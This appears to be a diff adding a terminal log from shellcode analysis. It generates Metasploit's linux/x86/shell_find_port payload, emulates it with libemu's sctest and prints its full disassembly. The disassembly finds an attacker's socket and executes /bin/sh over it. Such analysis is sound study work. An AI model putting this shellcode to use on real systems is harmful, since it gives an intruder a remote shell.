@@ -1,0 +1,38 @@
+roman@ubuntu:~# msfpayload linux/x86/shell_find_port S > shell_find_port
+roman@ubuntu:~/libemu/tools/sctest$ cat shell_find_port |./sctest -vvv -Ss 10000 -G shell_find_port.dot
+roman@ubuntu:~/libemu/tools/sctest$ dot shell_find_port.dot -Tpng -o shell_find_port.png
+[Wolokoso]
+roman@ubuntu:~/libemu/tools/sctest$ cat new_shell_find_port |ndisasm -u -
+00000000  31DB              xor ebx,ebx
+00000002  53                push ebx
+00000003  89E7              mov edi,esp
+00000005  6A10              push byte +0x10
+00000007  54                push esp
+00000008  57                push edi
+00000009  53                push ebx
+0000000A  89E1              mov ecx,esp
+0000000C  B307              mov bl,0x7
+0000000E  FF01              inc dword [ecx]
+00000010  6A66              push byte +0x66
+00000012  58                pop eax
+00000013  CD80              int 0x80
+00000015  66817F02B232      cmp word [edi+0x2],0x32b2
+0000001B  75F1              jnz 0xe
+0000001D  5B                pop ebx
+0000001E  6A02              push byte +0x2
+00000020  59                pop ecx
+00000021  B03F              mov al,0x3f
+00000023  CD80              int 0x80
+00000025  49                dec ecx
+00000026  79F9              jns 0x21
+00000028  50                push eax
+00000029  682F2F7368        push dword 0x68732f2f
+0000002E  682F62696E        push dword 0x6e69622f
+00000033  89E3              mov ebx,esp
+00000035  50                push eax
+00000036  53                push ebx
+00000037  89E1              mov ecx,esp
+00000039  99                cdq
+0000003A  B00B              mov al,0xb
+0000003C  CD80              int 0x80
+[Wolokoso]
